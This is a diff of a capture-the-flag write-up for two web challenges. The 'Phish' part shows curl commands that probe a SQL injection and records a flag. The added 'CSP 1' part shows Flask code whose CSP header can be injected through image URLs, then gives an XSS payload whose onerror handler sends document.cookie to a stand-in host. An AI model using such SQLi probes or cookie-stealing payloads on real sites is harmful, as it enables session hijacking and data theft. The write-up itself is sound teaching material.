@@ -2,9 +2,9 @@
 
 <h1>Phish</h1>
 
-From the start testing - ```curl http://phish.sf.ctf.so/add --data"username=test&password=test2'``` will returns an SQL error which means it's vulnerible to SQLi.
+From the start testing - `curl http://phish.sf.ctf.so/add --data"username=test&password=test2'` will returns an SQL error which means it's vulnerible to SQLi.
 
-Testing ```curl http://phish.sf.ctf.so/add --data "username=' UNION SELECT 1,2 #&password=test2"``` returns ```unrecognized token: "#"```
+Testing `curl http://phish.sf.ctf.so/add --data "username=' UNION SELECT 1,2 #&password=test2"` returns `unrecognized token: "#"`
 
 The database is not MySQL so let's run an SQL query to try to find what DB it is.
 
@@ -53,3 +53,35 @@ for offset in range(1, 64): # 64 is the size of the flag - based from manual tes
 ```
 
 FLAG: we{e0df7105-edcd-4dc6-8349-f3bef83643a9@h0P3_u_didnt_u3e_sq1m4P}
+
+<h1>CSP 1</h1>
+Looking into code of app.py we see that filter_url() adds all image urls to img-src policy.
+
+```
+def filter_url(urls):
+    domain_list = []
+    for url in urls:
+        domain = urllib.parse.urlparse(url).scheme + "://" + urllib.parse.urlparse(url).netloc
+        if domain:
+            domain_list.append(domain)
+    return " ".join(domain_list)
+		
+@app.route('/display/<token>')
+def display(token):
+    user_obj = Post.select().where(Post.token == token)
+    content = user_obj[-1].content if len(user_obj) > 0 else "Not Found"
+    img_urls = [x['src'] for x in bs(content).find_all("img")]
+    tmpl = render_template("display.html", content=content)
+    resp = make_response(tmpl)
+    resp.headers["Content-Security-Policy"] = "default-src 'none'; connect-src 'self'; img-src " \
+                                              f"'self' {filter_url(img_urls)}; script-src 'none'; " \
+                                              "style-src 'self'; base-uri 'self'; form-action 'self' "
+    return resp
+```
+
+We just need to inject script-src policty that allows us to execute.
+
+Payload:
+
+
+```<img src="https://*; script-src 'unsafe-inline'" onerror="var img = new Image(); img.src = 'https://intercept.xxx?b='+document.cookie; document.body.appendChild(img);">```
